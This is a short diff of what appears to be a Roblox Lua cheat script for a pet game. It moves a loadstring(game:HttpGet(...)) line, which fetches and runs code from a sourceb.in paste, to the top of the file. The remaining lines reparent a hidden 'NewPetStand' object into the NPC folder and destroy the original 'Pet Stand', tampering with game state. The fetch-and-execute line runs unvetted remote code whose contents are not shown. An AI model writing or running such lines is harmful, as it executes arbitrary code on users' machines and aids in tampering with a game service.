@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/w3KHA6FluC/0", true))()
 game:GetService("ReplicatedStorage").Modules.UpdateService.NewPetStand.Parent = workspace.NPCS
 workspace.NPCS["Pet Stand"]:Destroy()
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/w3KHA6FluC/0", true))()
+
